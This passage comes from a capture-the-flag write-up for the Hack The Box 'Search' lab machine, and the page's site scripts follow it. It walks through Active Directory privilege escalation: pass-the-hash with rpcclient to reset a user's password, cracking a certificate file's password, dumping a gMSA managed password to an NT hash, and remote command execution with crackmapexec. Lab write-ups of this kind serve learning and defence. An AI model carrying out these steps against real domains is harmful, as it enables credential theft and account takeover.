<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> pth-rpcclient <span class="at">-U</span> search.htb/BIR-ADFS-GMSA$%00000000000000000000000000000000:e1e9fd9e46d0d747e1595167eedcec0f //10.10.11.129                           1 ⨯</span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="ex">E_md4hash</span> wrapper called.</span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="ex">HASH</span> PASS: Substituting user supplied NTLM HASH...</span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> setuserinfo2 tristan.davies 23 ASDqwe123!</span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="ex">E_md4hash</span> wrapper called.</span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="ex">E_deshash</span> wrapper called.</span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> smbclient <span class="dt">\\\\</span>10.10.11.129<span class="dt">\\</span>C$ <span class="at">-U</span> tristan.davies</span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> WORKGROUP<span class="dt">\t</span>ristan.davies password: ASDqwe123!</span>
<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\U</span>sers<span class="dt">\A</span>dministrator<span class="dt">\D</span>esktop<span class="dt">\&gt;</span> ls</span>
<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a>  <span class="bu">.</span>                                 DRc        0  Mon Nov 22 21:21:49 2021</span>
<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a>  <span class="ex">..</span>                                DRc        0  Mon Nov 22 21:21:49 2021</span>
<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a>  <span class="ex">desktop.ini</span>                       AHS      282  Mon Nov 22 21:21:49 2021</span>
<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a>  <span class="ex">root.txt</span>                          ARc       34  Mon Jan  3 09:51:07 2022</span>
<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-21"><a href="#cb17-21" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\U</span>sers<span class="dt">\A</span>dministrator<span class="dt">\D</span>esktop<span class="dt">\&gt;</span> get root.txt</span>
<span id="cb17-22"><a href="#cb17-22" aria-hidden="true" tabindex="-1"></a><span class="ex">getting</span> file <span class="dt">\U</span>sers<span class="dt">\A</span>dministrator<span class="dt">\D</span>esktop<span class="dt">\r</span>oot.txt of size 34 as root.txt <span class="er">(</span><span class="ex">0.3</span> KiloBytes/sec<span class="kw">)</span> <span class="kw">(</span><span class="ex">average</span> 0.3 KiloBytes/sec<span class="kw">)</span></span>
<span id="cb17-23"><a href="#cb17-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-24"><a href="#cb17-24" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb17-25"><a href="#cb17-25" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> cat root.txt                                                                      </span>
<span id="cb17-26"><a href="#cb17-26" aria-hidden="true" tabindex="-1"></a><span class="ex">33bf73102463a90e0fba8b6b9c3e4387</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
</section>
<section id="root-method-2" class="level1">
<h1>ROOT Method 2</h1>
<section id="step-1-2" class="level3">
<h3 class="anchored" data-anchor-id="step-1-2">Step 1</h3>
<p>We previously downloaded two certificate files from sierra through SMB, <code>staff.pfx</code> and <code>search-RESEARCH-CA.p12</code>.</p>
<pre class="ad-quote"><code>The PKCS#12 or PFX format is a binary format for storing the server certificate, intermediate certificates, and the private key in one encryptable file. PFX files usually have extensions such as .pfx and .p12. PFX files are typically used on Windows machines to import and export certificates and private keys.</code></pre>
<p>To import the .pfx or .p12 files into Firefox we need to find its respective password. There are tools that can help us with this process, eg. <code>pfx2john</code>.</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> /usr/share/john/pfx2john.py smb-loot/staff.pfx <span class="kw">|</span> <span class="ex">john</span> <span class="at">--wordlist</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt /dev/stdin                                          1 ⨯</span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Using</span> default input encoding: UTF-8</span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Loaded</span> 1 password hash <span class="er">(</span><span class="ex">pfx</span> [PKCS12 PBE <span class="er">(</span><span class="ex">.pfx,</span> .p12<span class="kw">)</span> <span class="kw">(</span><span class="ex">SHA-1</span> to SHA-512<span class="kw">)</span> <span class="ex">256/256</span> AVX2 8x]<span class="kw">)</span></span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Cost</span> 1 <span class="er">(</span><span class="ex">iteration</span> count<span class="kw">)</span> <span class="ex">is</span> 2000 for all loaded hashes</span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Cost</span> 2 <span class="er">(</span><span class="ex">mac-type</span> [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]<span class="kw">)</span> <span class="ex">is</span> 1 for all loaded hashes</span>
<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Will</span> run 2 OpenMP threads</span>
<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Press</span> <span class="st">'q'</span> or Ctrl-C to abort, almost any other key for status</span>
<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a><span class="ex">misspissy</span>        <span class="er">(</span><span class="ex">staff.pfx</span><span class="kw">)</span></span>
<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a><span class="ex">1g</span> 0:00:02:33 DONE <span class="er">(</span><span class="ex">2022-01-04</span> 15:11<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Or if you’re super hipster and want to <strong>wait for a few hours</strong>, you can also run the loops below.</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search/smb-loot]</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> cat /usr/share/wordlists/rockyou.txt <span class="kw">|</span> <span class="cf">while</span> <span class="bu">read</span> <span class="va">p</span><span class="kw">;</span> <span class="cf">do</span> <span class="bu">echo</span> Trying: <span class="va">$p</span><span class="kw">;</span> <span class="ex">openssl</span> pkcs12 <span class="at">-in</span> staff.pfx <span class="at">-passin</span> pass:<span class="va">$p</span><span class="kw">;</span> <span class="va">RC</span><span class="op">=</span><span class="va">$?</span><span class="kw">;</span> <span class="cf">if</span> <span class="bu">[</span> <span class="va">$RC</span> <span class="ot">-eq</span> 0 <span class="bu">]</span><span class="kw">;</span> <span class="cf">then</span> <span class="cf">break</span><span class="kw">;</span> <span class="cf">fi</span><span class="kw">;</span> <span class="cf">done</span></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Trying:</span> 123</span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Mac</span> verify error: invalid password<span class="pp">?</span></span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Trying:</span> misspissy</span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Bag</span> Attributes</span>
<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">localKeyID:</span> 01 00 00 00 </span>
<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Microsoft</span> CSP Name: Microsoft Enhanced Cryptographic Provider v1.0</span>
<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">friendlyName:</span> te-ITSecOps-42ad83c7-07ac-4daa-b273-be11dd691da5</span>
<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Key</span> Attributes</span>
<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">X509v3</span> Key Usage: 10 </span>
<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> PEM pass phrase:</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Import the certificate to Firefox, clear the Cookies and Site Data, and we should now be able to reach https://search.htb/staff.</p>
<hr>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>We previously found that users in the group ITSec also are a part of the group <code>Remote Management Users</code>, giving us two options. 1. ITSec user Sierra.Frye (password: <code>$$49=wide=STRAIGHT=jordan=28$$18</code>) 2. ITSec user Abby.Gonzalez (password: <code>&amp;&amp;75:major:RADIO:state:93&amp;&amp;</code>) ![[Pasted image 20220104154915.png]]</p>
<p>Looking in Bloodhound we can clearly see the option how to pwn the domain, from left to right. Both Abby and Sierra can login to research.search.htb (<code>CanPsRemote</code>), through https://search.htb/staff, and from there we should be able to dump the GMSA hash (since group <code>ITSec</code> have <code>ReadGMSAPassword</code> to account <code>BIR-ADFS-GMSA</code> that we saw in Method 1). ![[Pasted image 20220105073905.png]]</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Users\Sierra<span class="op">.</span><span class="fu">Frye</span>\Documents<span class="op">&gt;</span> <span class="va">$gmsa</span> <span class="op">=</span> <span class="fu">Get-ADServiceAccount</span> <span class="op">-</span>Identity <span class="st">'BIR-ADFS-GMSA'</span> <span class="op">-</span>Properties <span class="st">'msDS-ManagedPassword'</span></span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Users\Sierra<span class="op">.</span><span class="fu">Frye</span>\Documents<span class="op">&gt;</span> <span class="va">$mp</span> <span class="op">=</span> ConvertFrom-ADManagedPasswordBlob <span class="va">$gmsa</span><span class="op">.</span><span class="st">'msDS-ManagedPassword'</span></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Users\Sierra<span class="op">.</span><span class="fu">Frye</span>\Documents<span class="op">&gt;</span> <span class="va">$mp</span></span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>Version                   <span class="op">:</span> <span class="dv">1</span></span>
<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="dt">CurrentPassword</span>           <span class="op">:</span> ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤</span>
<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a>                            ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇</span>
<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>SecureCurrentPassword     <span class="op">:</span> System<span class="op">.</span><span class="fu">Security</span><span class="op">.</span><span class="fu">SecureString</span></span>
<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a>PreviousPassword          <span class="op">:</span> </span>
<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a>SecurePreviousPassword    <span class="op">:</span> </span>
<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a>QueryPasswordInterval     <span class="op">:</span> <span class="dv">3013.16</span><span class="op">:</span><span class="dv">52</span><span class="op">:</span><span class="dv">19.9664471</span></span>
<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a><span class="dt">UnchangedPasswordInterval</span> <span class="op">:</span> <span class="dv">3013.16</span><span class="op">:</span><span class="dv">47</span><span class="op">:</span><span class="dv">19.9664471</span></span>
<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a><span class="dt">PS</span> C<span class="op">:</span>\Users\Sierra<span class="op">.</span><span class="fu">Frye</span>\Documents<span class="op">&gt;</span> ConvertTo-NTHash <span class="va">$mp</span><span class="op">.</span><span class="fu">SecureCurrentPassword</span></span>
<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a>e1e9fd9e46d0d747e1595167eedcec0f</span>
<span id="cb21-16"><a href="#cb21-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-17"><a href="#cb21-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-18"><a href="#cb21-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-19"><a href="#cb21-19" aria-hidden="true" tabindex="-1"></a>      <span class="fu">PS</span> C<span class="op">:</span>\Users\Sierra<span class="op">.</span><span class="fu">Frye</span>\Documents<span class="op">&gt;</span> <span class="va">$user</span> <span class="op">=</span> <span class="st">'control.htb\hector'</span></span>
<span id="cb21-20"><a href="#cb21-20" aria-hidden="true" tabindex="-1"></a>      <span class="fu">PS</span> C<span class="op">:</span>\Users\Sierra<span class="op">.</span><span class="fu">Frye</span>\Documents<span class="op">&gt;</span> <span class="va">$creds</span> <span class="op">=</span> <span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Management</span><span class="op">.</span><span class="fu">Automation</span><span class="op">.</span><span class="fu">PSCredential</span><span class="op">(</span><span class="va">$user</span><span class="op">,</span><span class="va">$mp</span><span class="op">.</span><span class="fu">SecureCurrentPassword</span><span class="op">)</span></span>
<span id="cb21-21"><a href="#cb21-21" aria-hidden="true" tabindex="-1"></a>      <span class="fu">PS</span> C<span class="op">:</span>\Users\Sierra<span class="op">.</span><span class="fu">Frye</span>\Documents<span class="op">&gt;</span> <span class="fu">Invoke-Command</span> <span class="op">-</span>ComputerName localhost <span class="op">-</span>Credential <span class="va">$creds</span> <span class="op">-</span>ScriptBlock <span class="op">{</span> whoami <span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>Pass-the-Hash as <code>BIR-ADFS-GMSA$</code> over rpcclient, change password to <code>tristan.davies</code> and grab root.</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> pth-rpcclient <span class="at">-U</span> search.htb/BIR-ADFS-GMSA$%00000000000000000000000000000000:e1e9fd9e46d0d747e1595167eedcec0f //10.10.11.129</span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="ex">E_md4hash</span> wrapper called.</span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="ex">HASH</span> PASS: Substituting user supplied NTLM HASH...</span>
<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> setuserinfo2 tristan.davies 23 ASDqwe123!</span>
<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> crackmapexec smb 10.10.11.129 <span class="at">-u</span> tristan.davies <span class="at">-p</span> ASDqwe123! <span class="at">-x</span> <span class="st">'type C:\Users\Administrator\Desktop\root.txt'</span></span>
<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a><span class="ex">SMB</span>         10.10.11.129    445    RESEARCH         <span class="pp">[</span><span class="ss">*</span><span class="pp">]</span> Windows 10.0 Build 17763 x64 <span class="er">(</span><span class="ex">name:RESEARCH</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">domain:search.htb</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">signing:True</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">SMBv1:False</span><span class="kw">)</span></span>
<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="ex">SMB</span>         10.10.11.129    445    RESEARCH         <span class="pp">[</span><span class="ss">+</span><span class="pp">]</span> search.htb<span class="dt">\t</span>ristan.davies:ASDqwe123! <span class="er">(</span><span class="ex">Pwn3d!</span><span class="kw">)</span></span>
<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="ex">SMB</span>         10.10.11.129    445    RESEARCH         <span class="pp">[</span><span class="ss">+</span><span class="pp">]</span> Executed command </span>
<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a><span class="ex">SMB</span>         10.10.11.129    445    RESEARCH         8ffdc3acd86000b9eb7ace10e0c0462a</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
</section>
<section id="references" class="level1">
<h1>References</h1>
<p><strong>ReadGMSAPassword:</strong> https://www.thehacker.recipes/ad/movement/access-controls/readgmsapassword https://stealthbits.com/blog/securing-gmsa-passwords/</p>
<p><strong>gMSADumper:</strong> https://github.com/micahvandeusen/gMSADumper</p>
<p><strong>Pass-the-Hash attacks:</strong> https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</p>
<p><strong>rpcclient - change ad password:</strong> https://malicious.link/post/2017/reset-ad-user-password-with-linux/</p>
<p><strong>bash return code (RC=$?)</strong>: https://www.toolbox.com/tech/programming/question/help-with-rc-03310</p>


</section>

</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
  window.document.addEventListener("DOMContentLoaded", function (event) {
    const icon = "";
    const anchorJS = new window.AnchorJS();
    anchorJS.options = {
      placement: 'right',
      icon: icon
    };
    anchorJS.add('.anchored');
    const isCodeAnnotation = (el) => {
      for (const clz of el.classList) {
        if (clz.startsWith('code-annotation-')) {                     
          return true;
        }
      }
      return false;
    }
    const onCopySuccess = function(e) {
      // button target
      const button = e.trigger;
      // don't keep focus
      button.blur();
      // flash "checked"
      button.classList.add('code-copy-button-checked');
      var currentTitle = button.getAttribute("title");
      button.setAttribute("title", "Copied!");
      let tooltip;
      if (window.bootstrap) {
        button.setAttribute("data-bs-toggle", "tooltip");
        button.setAttribute("data-bs-placement", "left");
        button.setAttribute("data-bs-title", "Copied!");
        tooltip = new bootstrap.Tooltip(button, 
          { trigger: "manual", 
            customClass: "code-copy-button-tooltip",
            offset: [0, -8]});
        tooltip.show();    
      }
      setTimeout(function() {
        if (tooltip) {
          tooltip.hide();
          button.removeAttribute("data-bs-title");
          button.removeAttribute("data-bs-toggle");
          button.removeAttribute("data-bs-placement");
        }
        button.setAttribute("title", currentTitle);
        button.classList.remove('code-copy-button-checked');
      }, 1000);
      // clear code selection
      e.clearSelection();
    }
    const getTextToCopy = function(trigger) {
        const codeEl = trigger.previousElementSibling.cloneNode(true);
        for (const childEl of codeEl.children) {
          if (isCodeAnnotation(childEl)) {
            childEl.remove();
          }
        }
        return codeEl.innerText;
    }
    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
      text: getTextToCopy
    });
    clipboard.on('success', onCopySuccess);
    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
        text: getTextToCopy,
        container: window.document.getElementById('quarto-embedded-source-code-modal')
      });
      clipboardModal.on('success', onCopySuccess);
    }
      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
      var mailtoRegex = new RegExp(/^mailto:/);
        var filterRegex = new RegExp("https:\/\/exploit\.se");
      var isInternal = (href) => {
          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
      }
      // Inspect non-navigation links and adorn them if external
     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
      for (var i=0; i<links.length; i++) {
        const link = links[i];
        if (!isInternal(link.href)) {
          // undo the damage that might have been done by quarto-nav.js in the case of
          // links that we want to consider external
          if (link.dataset.originalHref !== undefined) {
            link.href = link.dataset.originalHref;
          }
        }
      }
    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
      const config = {
        allowHTML: true,
        maxWidth: 500,
        delay: 100,
        arrow: false,
        appendTo: function(el) {
            return el.parentElement;
        },
        interactive: true,
        interactiveBorder: 10,
        theme: 'quarto',
        placement: 'bottom-start',
      };
      if (contentFn) {
        config.content = contentFn;
      }
      if (onTriggerFn) {
        config.onTrigger = onTriggerFn;
      }
      if (onUntriggerFn) {
        config.onUntrigger = onUntriggerFn;
      }
      window.tippy(el, config); 
    }
    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
    for (var i=0; i<noterefs.length; i++) {
      const ref = noterefs[i];
      tippyHover(ref, function() {
        // use id or data attribute instead here
        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
        try { href = new URL(href).hash; } catch {}
        const id = href.replace(/^#\/?/, "");
        const note = window.document.getElementById(id);
        if (note) {
          return note.innerHTML;
        } else {
          return "";
        }
      });
    }
    const xrefs = window.document.querySelectorAll('a.quarto-xref');
    const processXRef = (id, note) => {
      // Strip column container classes
      const stripColumnClz = (el) => {
        el.classList.remove("page-full", "page-columns");
        if (el.children) {
          for (const child of el.children) {
            stripColumnClz(child);
          }
        }
      }
      stripColumnClz(note)
      if (id === null || id.startsWith('sec-')) {
        // Special case sections, only their first couple elements
        const container = document.createElement("div");
        if (note.children && note.children.length > 2) {
          container.appendChild(note.children[0].cloneNode(true));
          for (let i = 1; i < note.children.length; i++) {
            const child = note.children[i];
            if (child.tagName === "P" && child.innerText === "") {
              continue;
            } else {
              container.appendChild(child.cloneNode(true));
              break;
            }
          }
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(container);
          }
          return container.innerHTML
        } else {
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(note);
          }
          return note.innerHTML;
        }
      } else {
        // Remove any anchor links if they are present
        const anchorLink = note.querySelector('a.anchorjs-link');
        if (anchorLink) {
          anchorLink.remove();
        }
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(note);
        }
        if (note.classList.contains("callout")) {
          return note.outerHTML;
        } else {
          return note.innerHTML;
        }
      }
    }
    for (var i=0; i<xrefs.length; i++) {
      const xref = xrefs[i];
      tippyHover(xref, undefined, function(instance) {
        instance.disable();
        let url = xref.getAttribute('href');
        let hash = undefined; 
        if (url.startsWith('#')) {
          hash = url;
        } else {
          try { hash = new URL(url).hash; } catch {}
        }
        if (hash) {
          const id = hash.replace(/^#\/?/, "");
          const note = window.document.getElementById(id);
          if (note !== null) {
            try {
              const html = processXRef(id, note.cloneNode(true));
              instance.setContent(html);
            } finally {
              instance.enable();
              instance.show();
            }
          } else {
            // See if we can fetch this
            fetch(url.split('#')[0])
            .then(res => res.text())
            .then(html => {
              const parser = new DOMParser();
              const htmlDoc = parser.parseFromString(html, "text/html");
              const note = htmlDoc.getElementById(id);
              if (note !== null) {
                const html = processXRef(id, note);
                instance.setContent(html);
              } 
            }).finally(() => {
              instance.enable();
              instance.show();
            });
          }
        } else {
          // See if we can fetch a full url (with no hash to target)
          // This is a special case and we should probably do some content thinning / targeting
          fetch(url)
          .then(res => res.text())
          .then(html => {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(html, "text/html");
            const note = htmlDoc.querySelector('main.content');
            if (note !== null) {
              // This should only happen for chapter cross references
              // (since there is no id in the URL)
              // remove the first header
              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
                note.children[0].remove();
              }
              const html = processXRef(null, note);
              instance.setContent(html);
            } 
          }).finally(() => {
            instance.enable();
            instance.show();
          });
        }
      }, function(instance) {
      });
    }
        let selectedAnnoteEl;
        const selectorForAnnotation = ( cell, annotation) => {
          let cellAttr = 'data-code-cell="' + cell + '"';
          let lineAttr = 'data-code-annotation="' +  annotation + '"';
          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
          return selector;
        }
        const selectCodeLines = (annoteEl) => {
          const doc = window.document;
          const targetCell = annoteEl.getAttribute("data-target-cell");
          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
          const lineIds = lines.map((line) => {
            return targetCell + "-" + line;
          })
          let top = null;
          let height = null;
          let parent = null;
          if (lineIds.length > 0) {
              //compute the position of the single el (top and bottom and make a div)
              const el = window.document.getElementById(lineIds[0]);
              top = el.offsetTop;
              height = el.offsetHeight;
              parent = el.parentElement.parentElement;
            if (lineIds.length > 1) {
              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
              height = bottom - top;
            }
            if (top !== null && height !== null && parent !== null) {
              // cook up a div (if necessary) and position it 
              let div = window.document.getElementById("code-annotation-line-highlight");
              if (div === null) {
                div = window.document.createElement("div");
                div.setAttribute("id", "code-annotation-line-highlight");
                div.style.position = 'absolute';
                parent.appendChild(div);
              }
              div.style.top = top - 2 + "px";
              div.style.height = height + 4 + "px";
              div.style.left = 0;
              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
              if (gutterDiv === null) {
                gutterDiv = window.document.createElement("div");
                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
                gutterDiv.style.position = 'absolute';
                const codeCell = window.document.getElementById(targetCell);
                const gutter = codeCell.querySelector('.code-annotation-gutter');
                gutter.appendChild(gutterDiv);
              }
              gutterDiv.style.top = top - 2 + "px";
              gutterDiv.style.height = height + 4 + "px";
            }
            selectedAnnoteEl = annoteEl;
          }
        };
        const unselectCodeLines = () => {
          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
          elementsIds.forEach((elId) => {
            const div = window.document.getElementById(elId);
            if (div) {
